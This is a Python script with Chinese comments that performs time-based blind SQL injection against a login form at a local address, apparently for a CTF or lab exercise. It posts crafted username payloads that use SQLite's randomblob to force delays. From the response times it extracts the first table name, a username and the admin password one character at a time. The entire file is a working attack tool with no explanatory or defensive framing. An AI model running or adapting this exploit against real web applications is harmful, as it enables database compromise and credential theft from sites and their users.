import requests
import time
#获取所有可见字符
charlist=[]
for i in range(32,126):
	charlist.append(chr(i))

url='http://127.0.0.1:5000/login'

passwd='1'

#获取表长
def GetTbaleLength(url):
	table_length=0
	for i in range(10):
		uname="a'/**/or/**/1=(case/**/when/**/length(((Select/**/name/**/From/**/sqlite_master/**/where/**/type='table'/**/limit/**/0,1)))="+str(i)+"/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)/**/and/**/'1'='1"
		d={'username':uname,'password':passwd}
		#计时开始
		start_time=time.time()
		result=requests.post(url,data=d)
		end_time=time.time()
		cost_time=end_time-start_time
		
		if cost_time>2:
			table_length+=i
			print('表长为:',table_length)
	return table_length

#获取表名
def GetTableName(url,table_length):
	table_name=''
	for i in range(1,table_length+1):
		for j in charlist:
			uname="a'/**/or/**/1=(case/**/when/**/substr((Select/**/name/**/From/**/sqlite_master/**/where/**/type='table'/**/limit/**/0,1),"+str(i)+",1)='"+j+"'/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)/**/and/**/'1'='1"
			d={'username':uname,'password':passwd}
			#计时开始
			start_time=time.time()
			result=requests.post(url,data=d)
			end_time=time.time()
			cost_time=end_time-start_time
			if cost_time>2:
				table_name=table_name+str(j)
				print('表名为：',table_name)
	return table_name

#获取用户名长度
def GetUnameLength(url,table_name):
	uname_length=0
	for i in range(10):
		uname="a'/**/or/**/1=(case/**/when/**/length((Select/**/username/**/From/**/(SELECT/**/*/**/FROM/**/"+table_name+")))="+str(i)+"/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)/**/and/**/'1'='1"
		d={'username':uname,'password':passwd}
		#计时开始
		start_time=time.time()
		result=requests.post(url,data=d)
		end_time=time.time()
		cost_time=end_time-start_time
		if cost_time>2:
			uname_length+=i
			print('用户名长度为:',uname_length)
	return uname_length
#获取用户名
def GetUsername(url,table_name,uname_length):
	username=''
	for i in range(1,uname_length+1):
		for j in charlist:
			uname="a'/**/or/**/1=(case/**/when/**/substr((Select/**/username/**/From/**/(SELECT/**/*/**/FROM/**/"+table_name+")),"+str(i)+",1)='"+j+"'/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)/**/and/**/'1'='1"
			d={'username':uname,'password':passwd}
			#计时开始
			start_time=time.time()
			result=requests.post(url,data=d)
			end_time=time.time()
			cost_time=end_time-start_time
			if cost_time>2:
				username=username+str(j)
				print('用户名为：',username)
	return username
#获取密码	
def GetPassword(url,table_name,username):
	password=''
	for i in range(1,33):
		for j in charlist:
			uname=username+"'/**/and/**/1=(case/**/when/**/substr((Select/**/password/**/From/**/"+table_name+"/**/where/**/username='admin'/**/limit/**/0,1),"+str(i)+",1)='"+j+"'/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)/**/and/**/'1'='1"
			d={'username':uname,'password':passwd}
			#计时开始
			start_time=time.time()
			result=requests.post(url,data=d)
			end_time=time.time()
			cost_time=end_time-start_time
			if cost_time>2:
				password=password+str(j)
				print('密码为：',password)
	return password


if __name__ == '__main__':
	table_length=GetTbaleLength(url)
	table_name=GetTableName(url,table_length)
	uname_length=GetUnameLength(url,table_name)
	username=GetUsername(url,table_name,uname_length)
	password=GetPassword(url,table_name,username)